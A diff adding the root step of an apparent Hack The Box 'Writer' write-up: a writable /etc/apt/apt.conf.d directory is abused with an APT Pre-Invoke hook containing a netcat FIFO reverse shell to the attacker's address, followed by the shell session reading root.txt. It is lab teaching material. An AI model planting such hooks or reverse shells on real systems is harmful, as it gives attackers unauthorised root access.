@@ -398,3 +398,49 @@ john@writer:/home/john/.ssh$ cat id_rsa
 Last login: Wed Jul 28 09:19:58 2021 from 10.10.14.19
 john@writer:~$ 
 ```
+
+Executing Linpeas.sh script on user ```john```, we realize that ```john``` is part of the ```management``` group and this group have a writable file ```/etc/apt/apt.conf.d```
+
+```
+john@writer:~$ id
+uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
+```
+
+<img src = "https://github.com/joelczk/writeups/blob/main/HTB/Images/writer/apt_management.PNG" width = "1000">
+
+From the POSTFIX files, we realize that the ```disclaimer``` program will be executed when the user is ```john```. This would tell use that modification of ```/etc/apt/apt.conf.d``` directory will be executed by ```disclaimer```.
+
+```
+  flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
+```
+
+Now, we will try to create a reverse shell by creating a payload in the ```/etc/apt/apt.conf.d``` directory
+
+```
+john@writer:~$ cd /etc/apt/apt.conf.d
+john@writer:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.7 4444 >/tmp/f"};' > payload
+```
+
+Finally, we will stabilize the shell and extract the system flag
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.7] from (UNKNOWN) [10.10.11.101] 45550
+/bin/sh: 0: can't access tty; job control turned off
+# python3 -c 'import pty; pty.spawn("/bin/bash")'
+root@writer:/tmp# export TERM=xterm
+export TERM=xterm
+root@writer:/tmp# stty cols 132 rows 34
+stty cols 132 rows 34
+root@writer:/tmp# cd
+cd
+root@writer:~# ls
+ls
+root.txt  snap
+root@writer:~# cat root.txt
+cat root.txt
+<Redacted system flag>
+root@writer:~#
+```
